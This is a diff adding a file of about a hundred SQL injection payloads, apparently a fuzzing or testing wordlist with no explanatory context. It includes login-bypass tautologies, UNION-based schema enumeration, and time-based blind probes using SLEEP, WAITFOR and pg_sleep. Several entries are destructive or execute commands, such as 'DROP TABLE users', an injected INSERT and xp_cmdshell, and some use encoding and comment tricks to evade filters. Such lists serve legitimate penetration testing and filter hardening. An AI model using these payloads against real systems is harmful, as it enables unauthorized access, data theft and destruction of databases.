@@ -1,0 +1,104 @@
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+" OR "1"="1
+" OR "1"="1"--
+" OR 1=1--
+" OR 1=1#
+admin'--
+admin'#
+admin'/*
+') OR ('1'='1
+')) OR (('1'='1
+' OR 'x'='x
+'or 1=1 or ''='
+' OR ''='
+1' OR '1'='1
+1 OR 1=1
+1' OR 1=1--
+' OR 1=1 LIMIT 1--
+') OR 1=1--
+') OR ('x'='x
+' OR 2>1--
+' OR 'unusual'='unusual
+' OR 3=3--
+'='
+'LIKE'
+'=0--
+' AND '1'='1
+' AND 1=1--
+' AND 1=1#
+" AND "1"="1"--
+" AND 1=1--
+1' AND '1'='1
+1' AND 1=1--
+' AND 1=2--
+' AND 1=1 AND '1'='1
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+1 UNION SELECT NULL--
+1 UNION SELECT NULL,NULL--
+1 UNION SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+1' ORDER BY 4--
+1' ORDER BY 5--
+1' GROUP BY 1--
+1' GROUP BY 1,2--
+' HAVING 1=1--
+' HAVING 1=2--
+' AND SLEEP(5)--
+" AND SLEEP(5)--
+1 AND SLEEP(5)--
+1; SELECT SLEEP(5)--
+'; SELECT SLEEP(5)--
+' AND SLEEP(5) AND '1'='1
+" AND SLEEP(5) AND "1"="1
+1' AND SLEEP(5) AND '1'='1
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+" AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+'; WAITFOR DELAY '0:0:5'--
+1; WAITFOR DELAY '0:0:5'--
+'; SELECT pg_sleep(5)--
+1; SELECT pg_sleep(5)--
+'; SELECT 1 FROM pg_sleep(5)--
+1; EXEC xp_cmdshell('ping 127.0.0.1')--
+'; EXEC xp_cmdshell('ping 127.0.0.1')--
+'; SELECT * FROM information_schema.tables--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL FROM information_schema.columns--
+'; DROP TABLE users--
+'; INSERT INTO users VALUES('test','test')--
+%27 OR %271%27=%271
+%27 OR 1=1--
+%22 OR %221%22=%221
+%27%20OR%201=1--
+\' OR \'1\'=\'1
+\' OR 1=1--
+' OR 1=1;--
+'/**/OR/**/1=1--
+'%20OR%201=1--
+' OR/**/'1'='1
+'+OR+'1'='1
+'||'1'='1
+'||1=1--
+1'||'1'='1
+' OR 1=1 UNION SELECT NULL--
+'; SELECT @@version--
+'; SELECT version()--
+'; SELECT sqlite_version()--
+' AND 1=(SELECT COUNT(*) FROM tabname)--
+' AND 'x'='x
